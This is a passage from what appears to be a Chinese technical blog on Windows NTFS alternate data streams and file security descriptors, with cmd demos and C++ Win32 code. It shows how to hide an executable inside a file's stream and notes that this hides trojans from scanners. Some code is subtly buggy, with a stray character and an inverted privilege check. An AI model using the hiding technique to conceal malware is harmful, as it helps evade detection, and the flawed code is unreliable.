class=\"title\">ADS</span>&gt;<span class=\"title\">mkdir</span> <span class=\"title\">dir1</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">echo</span> <span class=\"title\">ThisIsDirADS1</span> &gt; <span class=\"title\">dir1:dirADS1</span>.<span class=\"title\">txt</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">DIR</span> /<span class=\"title\">R</span></span></span><br><span class=\"line\"><span class=\"function\"> 驱动器 <span class=\"title\">C</span> 中的卷是 <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"function\"> 卷的序列号是 <span class=\"title\">CC7A</span>-4265</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> <span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span> 的目录</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  22:09    &lt;<span class=\"title\">DIR</span>&gt;          .</span></span><br><span class=\"line\"><span class=\"function\">2023/03/07  22:47    &lt;<span class=\"title\">DIR</span>&gt;          ..</span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  22:09    &lt;<span class=\"title\">DIR</span>&gt;          <span class=\"title\">dir1</span></span></span><br><span class=\"line\"><span class=\"function\">                                 16 <span class=\"title\">dir1:dirADS1</span>.<span class=\"title\">txt</span>:$<span class=\"title\">DATA</span></span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  21:55                 0 <span class=\"title\">hello.txt</span></span></span><br><span class=\"line\"><span class=\"function\">                                 26 <span class=\"title\">hello.txt:ads1</span>.<span class=\"title\">txt</span>:$<span class=\"title\">DATA</span></span></span><br><span class=\"line\"><span class=\"function\">               1 个文件              0 字节</span></span><br><span class=\"line\"><span class=\"function\">               3 个目录 67,760,422,912 可用字节</span></span><br></pre></td></tr></table></figure></p>\n<p>也可以创建不指定宿主的ADS文件：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">echo</span> <span class=\"title\">ThisIsDirADS2</span> &gt; :<span class=\"title\">dirADS2.txt</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">DIR</span> /<span class=\"title\">R</span></span></span><br><span class=\"line\"><span class=\"function\"> 驱动器 <span class=\"title\">C</span> 中的卷是 <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"function\"> 卷的序列号是 <span class=\"title\">CC7A</span>-4265</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> <span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span> 的目录</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  22:13    &lt;<span class=\"title\">DIR</span>&gt;          .</span></span><br><span class=\"line\"><span class=\"function\">                                 16 .:<span class=\"title\">dirADS2.txt</span>:$<span class=\"title\">DATA</span></span></span><br><span class=\"line\"><span class=\"function\">2023/03/07  22:47    &lt;<span class=\"title\">DIR</span>&gt;          ..</span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  22:09    &lt;<span class=\"title\">DIR</span>&gt;          <span class=\"title\">dir1</span></span></span><br><span class=\"line\"><span class=\"function\">                                 16 <span class=\"title\">dir1:dirADS1</span>.<span class=\"title\">txt</span>:$<span class=\"title\">DATA</span></span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  21:55                 0 <span class=\"title\">hello.txt</span></span></span><br><span class=\"line\"><span class=\"function\">                                 26 <span class=\"title\">hello.txt:ads1</span>.<span class=\"title\">txt</span>:$<span class=\"title\">DATA</span></span></span><br><span class=\"line\"><span class=\"function\">               1 个文件              0 字节</span></span><br><span class=\"line\"><span class=\"function\">               3 个目录 67,745,931,264 可用字节</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">cd</span> ..</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\<span class=\"title\">Test</span>&gt;<span class=\"title\">DIR</span> /<span class=\"title\">R</span></span></span><br><span class=\"line\"><span class=\"function\"> 驱动器 <span class=\"title\">C</span> 中的卷是 <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"function\"> 卷的序列号是 <span class=\"title\">CC7A</span>-4265</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> <span class=\"title\">C</span>:\\<span class=\"title\">Test</span> 的目录</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">2023/03/07  22:47    &lt;<span class=\"title\">DIR</span>&gt;          .</span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  22:13    &lt;<span class=\"title\">DIR</span>&gt;          <span class=\"title\">ADS</span></span></span><br><span class=\"line\"><span class=\"function\">                                 16 <span class=\"title\">ADS:dirADS2</span>.<span class=\"title\">txt</span>:$<span class=\"title\">DATA</span></span></span><br></pre></td></tr></table></figure><br>这时可以观察到实际上<strong>创建的没有宿主的ADS会把当前目录作为自己的宿主</strong></p>\n<p>除了上述用<code>echo</code>命令向ADS文件写入数据外，<code>cmd.exe</code>还提供了一个<code>type</code>命令用于将指定文件写入ADS文件。例如：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Test\\ADS&gt;type &quot;C:\\Program Files\\Bandizip\\Bandizip.exe&quot; &gt; hello.txt:Bandzip.exe</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Test\\ADS&gt;dir /R </span><br><span class=\"line\"> 驱动器 C 中的卷是 Windows</span><br><span class=\"line\"> 卷的序列号是 CC7A-4265</span><br><span class=\"line\"></span><br><span class=\"line\"> C:\\Test\\ADS 的目录</span><br><span class=\"line\"></span><br><span class=\"line\">2023/03/28  22:13    &lt;DIR&gt;          .</span><br><span class=\"line\">                                 16 .:dirADS2.txt:$DATA</span><br><span class=\"line\">2023/03/07  22:47    &lt;DIR&gt;          ..</span><br><span class=\"line\">2023/03/28  22:09    &lt;DIR&gt;          dir1</span><br><span class=\"line\">                                 16 dir1:dirADS1.txt:$DATA</span><br><span class=\"line\">2023/03/28  22:32                 0 hello.txt</span><br><span class=\"line\">                                 26 hello.txt:ads1.txt:$DATA</span><br><span class=\"line\">                          3,211,240 hello.txt:Bandzip.exe:$DATA</span><br><span class=\"line\">               1 个文件              0 字节</span><br><span class=\"line\">               3 个目录 67,742,556,160 可用字节</span><br></pre></td></tr></table></figure><br>将一个可执行程序<code>Bandizip.exe</code>附加在了<code>hello.txt:Bandzip.exe</code>上，该过程是拷贝的，即<code>hello.txt:Bandzip.exe</code>占用独立的磁盘空间。由于ADS不可见的特性，ADS很容易被用于将木马文件隐藏在常规文件中以躲避操查杀。要删除ADS可以用特殊的工具，也可以将文件拷入不支持ADS特性的FAT32分区。</p>\n<h3 id=\"ADS-Win32-API\"><a href=\"#ADS-Win32-API\" class=\"headerlink\" title=\"ADS Win32 API\"></a>ADS Win32 API</h3><p>Windows提供<code>FindFirstStreamW</code>和<code>FindNextStreamW</code>来获取文件/目录拥有的所有数据流。</p>\n<ol>\n<li><p>首先用<code>FindFirstStreamW</code>查找文件对应的第一个<code>hStream</code>句柄。传入文件路径，第二参数固定为<code>_STREAM_INFO_LEVELS::FindStreamInfoStandard</code>，第四个参数固定为0。如果成功将把查找到的流的信息读入<code>WIN32_FIND_STREAM_DATA</code>结构，如果失败会返回<code>INVALID_HANDLE_VALUE</code>。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::wstring wPath = <span class=\"string\">LR&quot;(C:\\Test\\ADS\\hello.txt)&quot;</span>;</span><br><span class=\"line\">WIN32_FIND_STREAM_DATA findStreamData&#123;&#125;;</span><br><span class=\"line\">HANDLE hStream = ::<span class=\"built_in\">FindFirstStreamW</span>(</span><br><span class=\"line\">    wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">    _STREAM_INFO_LEVELS::FindStreamInfoStandard,</span><br><span class=\"line\">    &amp;findStreamData,</span><br><span class=\"line\">    <span class=\"number\">0</span></span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (hStream == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* get stream handle failed */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用<code>FindNextStreamW</code>结合之前获取的<code>hStream</code>继续查找下一个流的信息。这个过程和遍历文件用到的<code>FindNextFileW</code>很类似。当查找完成<code>FindNextStreamW</code>会失败，<code>GetLastError()</code>将会返回<code>ERROR_HANDLE_EOF</code>。查找成功下一个流的信息将会覆写入<code>WIN32_FIND_STREAM_DATA findStreamData</code>中。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">    std::cout &lt;&lt; findStreamData.cStreamName &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">FindNextStreamW</span>(hStream, &amp;findStreamData)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (::<span class=\"built_in\">GetLastError</span>() != ERROR_HANDLE_EOF) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* error occured */</span></span><br><span class=\"line\">            std::cerr &lt;&lt; <span class=\"string\">&quot;error happened&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>最后用<code>FindClose</code>关闭句柄，释放资源。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">::<span class=\"built_in\">FindClose</span>(hStream);</span><br><span class=\"line\">hStream = INVALID_HANDLE_VALUE;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>对于之前的<code>hello.txt</code>文件，会打印出这样的结果：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">::$DATA</span><br><span class=\"line\">:ads1.txt:$DATA</span><br><span class=\"line\">:ads2.txt:$DATA</span><br></pre></td></tr></table></figure><br>形式可以看成是<code>:&lt;stream name&gt;:$DATA</code>。其中<code>::$DATA</code>表示streamName为空，这表示一个主数据流，<strong>所有文件（非目录），无论是否包含ADS，都必定有一个主数据流</strong>。<code>:ads1.txt:$DATA</code>和<code>:ads2.txt:$DATA</code>表明<code>hello.txt</code>还包含两个ADS，分别为<code>ads1.txt</code>和<code>ads2.txt</code>。<strong>所有目录，都没有主数据流，但可能包含ADS</strong>。例如上文中<code>C:\\Test\\ADS\\dir1</code>可以拿到如下打印结果：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">:dirADS1.txt:$DATA</span><br><span class=\"line\">:dirADS2.txt:$DATA</span><br></pre></td></tr></table></figure></p>\n<p>无论目录还是文件的ADS都可以看作是文件。对于ADS的读取、创建、写入都可以直接用之前几章节提到的文件操作API <code>CreateFileW</code>、<code>ReadFile</code>、<code>WriteFile</code>等。传入的路径可以用<code>&lt;filePath&gt;:&lt;streamName&gt;</code>表示。打开一个ADS的句柄可以表示为：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::wstring wPath = <span class=\"string\">LR&quot;(C:\\Test\\ADS\\hello.txt:ads1.txt)&quot;</span>;</span><br><span class=\"line\">HANDLE hFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">    wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">    GENERIC_READ,</span><br><span class=\"line\">    FILE_SHARE_READ,</span><br><span class=\"line\">    <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">    OPEN_EXISTING,</span><br><span class=\"line\">    FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,</span><br><span class=\"line\">    <span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure><br>根据该句柄执行<code>ReadFile</code>和<code>WriteFile</code>就可以和读写常规文件一样读写ADS了。</p>\n<p>需要注意的是，对ADS的读写不光会改变ADS的内容，也会改变宿主文件的部分属性（例如AccessTime、ModifyTime），且<strong>ADS只和宿主在<em>数据流内容和大小</em>上相互区分，在元数据上他们和宿主是共享的</strong>。用获得的宿主文件句柄和ADS句柄可以获得一样的文件元数据信息（Index、设备号，时间，Attribute）。</p>\n<h3 id=\"相关API文档：\"><a href=\"#相关API文档：\" class=\"headerlink\" title=\"相关API文档：\"></a>相关API文档：</h3><ul>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirststreamw\">FindFirstStreamW</a>  </li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextstreamw\">FindNextStreamW</a>  </li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/ns-fileapi-win32_find_stream_data\">WIN32_FIND_STREAM_DATA</a>  </li>\n</ul>\n<h3 id=\"扩展资料\"><a href=\"#扩展资料\" class=\"headerlink\" title=\"扩展资料\"></a>扩展资料</h3><ul>\n<li><a href=\"https://blog.csdn.net/nzjdsds/article/details/81260524\">【web端权限维持】利用ADS隐藏webshell</a></li>\n<li><a href=\"https://blog.csdn.net/x1183834753/article/details/124384108\">【ADS】Windows下的ADS NTFS交换数据流</a></li>\n</ul>\n","tags":["Windows"]},{"title":"Windows文件系统概述(四)安全描述符","url":"/2023/03/20/Windows%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F4/","content":"<blockquote>\n<p>本文将介绍Windows文件系统中<strong>安全描述符（Security Descriptor）</strong></p>\n</blockquote>\n<h2 id=\"Security-Desciptor与Linux-ACL\"><a href=\"#Security-Desciptor与Linux-ACL\" class=\"headerlink\" title=\"Security Desciptor与Linux ACL\"></a>Security Desciptor与Linux ACL</h2><p>Windows安全描述符和Linux ACL（访问控制列表）都是操作系统用于管理文件和目录权限的机制。尽管它们的目的相似，但它们的实现和功能有所不同。以下是 Windows安全描述符和Linux ACL之间的一些主要区别：</p>\n<ul>\n<li>操作系统：Windows安全描述符用于Microsoft Windows操作系统，而Linux ACL用于基于Linux的操作系统。</li>\n<li>数据结构：Windows安全描述符使用一个复杂的数据结构，包括安全标识符（SID）、访问控制列表（ACL）和一组其他属性。Linux ACL由一系列的访问控制项（ACE）组成，每个ACE都包含一个标识符（用户或组）、权限和权限类型。</li>\n<li>继承：Windows安全描述符可以支持多层次的权限继承，文件和目录可以从父目录继承权限。Linux ACL也支持继承，但实现方式略有不同，使用默认ACL来定义新文件和目录的权限。</li>\n<li>权限管理：Windows安全描述符提供了详细的权限管理，包括读取、写入、执行、删除等多种操作。Linux ACL也提供了类似的权限管理，包括读取、写入和执行(rwx)，但相对来说较为简单。</li>\n<li>权限类型：Windows安全描述符包括两种类型的 ACL，即访问控制列表（DACL）和系统访问控制列表（SACL）。DACL用于控制文件和目录的访问权限，而 SACL用于记录对象的访问事件。Linux ACL只提供一种 ACL类型，用于控制访问权限。</li>\n<li>用户和组：Windows和Linux都使用用户和组来管理权限，但它们的实现方式不同。Windows使用安全标识符（SID）来表示用户和组，而Linux使用用户 ID（UID）和组 ID（GID）。</li>\n<li>工具和命令：Windows和Linux使用不同的工具和命令来管理文件和目录的权限。Windows中常用的工具包括图形界面和命令行工具，如“icacls”和“cacls”。在Linux系统中，可以使用命令如“chmod”、“chown”和“setfacl”等来管理权限。</li>\n</ul>\n<p>尽管 Windows安全描述符和Linux ACL在实现和功能上有所不同，但它们的核心目标是相同的，即为操作系统提供一种灵活、安全的权限管理机制。</p>\n<span id=\"more\"></span>\n<h2 id=\"ACE字符串\"><a href=\"#ACE字符串\" class=\"headerlink\" title=\"ACE字符串\"></a>ACE字符串</h2><p>Windows访问控制项（ACE）字符串是用于表示访问控制列表（ACL）中每个访问控制项的文本表示。它用于指定特定安全主体（如用户或组）的权限。ACE 字符串的结构包括以下几个组成部分：</p>\n<ul>\n<li>信任主体（Trustee）：表示安全主体的安全标识符（SID）或名称，通常是一个用户、组或计算机。信任主体可以是域用户、本地用户、内置用户（如 “SYSTEM” 或 “NETWORK SERVICE”）等。</li>\n<li>访问权限：指定允许或拒绝的访问权限。这些权限通常包括读取、写入、执行、删除、修改权限等。权限可以用缩写表示，例如，”R” 代表读取权限，”W” 代表写入权限，”X” 代表执行权限等。</li>\n<li>访问控制类型（Access Control Type）：表示授予或拒绝权限的类型。通常有两种类型，即允许（Allow，用 “A” 表示）和拒绝（Deny，用 “D” 表示）。</li>\n<li>继承标志（Inheritance Flags）：指示ACE是否应用于子对象（如子文件夹和文件）。常用的继承标志包括 “OI”（仅对象继承）、”CI”（仅容器继承）和 “IO”（继承只）。这些标志可以组合使用，例如 “OI|CI” 表示ACE应用于子对象和容器。</li>\n<li>附加选项（Optional Flags）：ACE 字符串可以包含附加选项，如继承属性 “NP”（不传播继承）或 “ID”（继承的）。这些选项有时用于控制更复杂的继承和权限行为。</li>\n</ul>\n<p>下面是一个示例ACE字符串：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">D:(A;OICI;FA;;;Administrator)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>“D” 代表它是一个访问控制项的描述符（Discretionary）。</li>\n<li>“A” 表示允许（Allow）权限。</li>\n<li>“OICI” 是继承标志，表示ACE应用于子对象（Object Inherit）和容器（Container Inherit）。</li>\n<li>“FA” 代表完全访问（Full Access）权限。</li>\n<li>“Administrator” 是信任主体，指示这个ACE应用于 “Administrator” 用户。</li>\n</ul>\n<p>此示例表示允许 “Administrator” 用户对文件或文件夹及其子对象具有完全访问权限。</p>\n<h2 id=\"Security-Descriptor-WIN32-API\"><a href=\"#Security-Descriptor-WIN32-API\" class=\"headerlink\" title=\"Security Descriptor WIN32 API\"></a>Security Descriptor WIN32 API</h2><h3 id=\"获取安全描述符\"><a href=\"#获取安全描述符\" class=\"headerlink\" title=\"获取安全描述符\"></a>获取安全描述符</h3><p>在C++中，你可以使用WindowsAPI来获取文件的完整安全描述符信息，包括SACL（系统访问控制列表）、DACL（访问控制列表）、属组（Group）和属主（Owner）。以下是一个示例，演示如何获取这些信息：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Aclapi.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;optional&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">GetSecurityDescriptorW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    PSECURITY_DESCRIPTOR pSecurityDescriptor = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PACL pDacl      = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PACL pSacl      = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PSID psidOwner  = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PSID psidGroup  = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    LPWSTR wSddlStr = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD result = ::<span class=\"built_in\">GetNamedSecurityInfoW</span>(</span><br><span class=\"line\">        wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        SE_FILE_OBJECT,</span><br><span class=\"line\">        DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION,</span><br><span class=\"line\">        &amp;psidOwner,</span><br><span class=\"line\">        &amp;psidGroup,</span><br><span class=\"line\">        &amp;pDacl,</span><br><span class=\"line\">        &amp;pSacl,</span><br><span class=\"line\">        &amp;pSecurityDescriptor);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> ret = ::<span class=\"built_in\">ConvertSecurityDescriptorToStringSecurityDescriptorW</span>(</span><br><span class=\"line\">        pSecurityDescriptor,</span><br><span class=\"line\">        SDDL_REVISION_1,</span><br><span class=\"line\">        DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION,</span><br><span class=\"line\">        &amp;wSddlStr,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!ret) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">std::wstring <span class=\"title\">res</span><span class=\"params\">(wSddlStr)</span></span>;</span><br><span class=\"line\">    ::<span class=\"built_in\">LocalFree</span>(wSddlStr);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;std::wstring&gt;(res);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该函数实现了两件事：</p>\n<ol>\n<li>使用<code>GetNamedSecurityInfoW</code>从文件中获取安全描述符指针<code>PSECURITY_DESCRIPTOR pSecurityDescriptor</code>。</li>\n<li>用<code>ConvertSecurityDescriptorToStringSecurityDescriptorW</code>将<code>PSECURITY_DESCRIPTOR pSecurityDescriptor</code>中存放的所有信息（DACL、SACL、Owner和Group）序列化成ACE字符串。</li>\n</ol>\n<p><code>psidOwner</code>、<code>psidGroup</code>、<code>pDacl</code>、<code>pSacl</code>分别指向文件的Owner、Group、DACL、SACL。<code>pSecurityDescriptor</code>指向文件的安全描述符信息，<code>pSecurityDescriptor</code>可以看成包含了上述所有信息。在使用完<code>pSecurityDescriptor</code>后需要用<code>LocalFree()</code>释放掉<code>pSecurityDescriptor</code>指向的资源。<code>psidOwner</code>、<code>psidGroup</code>、<code>pDacl</code>、<code>pSacl</code>如果不需要使用可以传入<code>nullptr</code>，且不需要释放资源。</p>\n<p><code>GetNamedSecurityInfoW</code>的第二个参数<code>DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION</code>用bitmap的形式声明要获取的安全描述符类型为DACL、Owner和Group。这里没有传入<code>SACL_SECURITY_INFORMATION</code>是因为SACL的获取需要进程有管理员权限，且需要开启<code>SE_SECURITY_NAME</code>权限，有关权限提升这部分内容后续章节再详细说明。</p>\n<p>之前使用<code>GetNamedSecurityInfoW</code>成功获取了<code>pSecurityDescriptor</code>指针后就可以用<code>ConvertSecurityDescriptorToStringSecurityDescriptorW</code>将它其中的内容序列化ACE字符串了，这里直接传入<code>DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION</code>序列化所有信息即可。</p>\n<h3 id=\"设置安全描述符\"><a href=\"#设置安全描述符\" class=\"headerlink\" title=\"设置安全描述符\"></a>设置安全描述符</h3><p>Windows提供<code>SetNamedSecurityInfo</code> API用于设置安全描述符。设置安全描述符需要提供指向Owner、Group、DACL、SACL的指针，即上文<code>GetNamedSecurityInfoW</code>获得的<code>psidOwner</code>、<code>psidGroup</code>、<code>pDacl</code>、<code>pSacl</code>。而对于上文序列化为字符串的安全描述符，则需要用<code>ConvertStringSecurityDescriptorToSecurityDescriptor</code>先将它解析成<code>pSecurityDescriptor</code>指针，再从中获得<code>psidOwner</code>、<code>psidGroup</code>、<code>pDacl</code>、<code>pSacl</code>。以下是从ACE字符串中设置安全描述符的具体实现：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">SetSecurityDescriptorW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath, <span class=\"keyword\">const</span> std::wstring&amp; wSddlStr)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    PSECURITY_DESCRIPTOR pSecurityDescriptor = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PACL pDacl      = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PACL pSacl      = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PSID psidOwner  = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    PSID psidGroup  = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    SECURITY_INFORMATION flags = DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get SACL need to enable privilege SE_SECURITY_NAME */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">EnablePrivilege</span>(SE_SECURITY_NAME)) &#123;</span><br><span class=\"line\">        flags |= SACL_SECURITY_INFORMATION;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* convert sddlStr back to pSecurityDescriptor */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">ConvertStringSecurityDescriptorToSecurityDescriptor</span>(</span><br><span class=\"line\">            wSddlStr.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">            SDDL_REVISION_1,</span><br><span class=\"line\">            &amp;pSecurityDescriptor,</span><br><span class=\"line\">            <span class=\"literal\">nullptr</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get Owner from pSecurityDescriptor */</span></span><br><span class=\"line\">    BOOL ownerDefaulted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">GetSecurityDescriptorOwner</span>(pSecurityDescriptor, &amp;psidOwner, &amp;ownerDefaulted)) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;w</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get Group from pSecurityDescriptor */</span></span><br><span class=\"line\">    BOOL groupDefaulted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">GetSecurityDescriptorGroup</span>(pSecurityDescriptor, &amp;psidGroup, &amp;groupDefaulted)) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get DACL from pSecurityDescriptor */</span></span><br><span class=\"line\">    BOOL bDaclPresent = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    BOOL bDaclDefaulted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">GetSecurityDescriptorDacl</span>(pSecurityDescriptor, &amp;bDaclPresent, &amp;pDacl, &amp;bDaclDefaulted) || !bDaclPresent) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get SACL from pSecurityDescriptor */</span></span><br><span class=\"line\">    BOOL bSaclPresent = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    BOOL bSaclDefaulted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">GetSecurityDescriptorSacl</span>(pSecurityDescriptor, 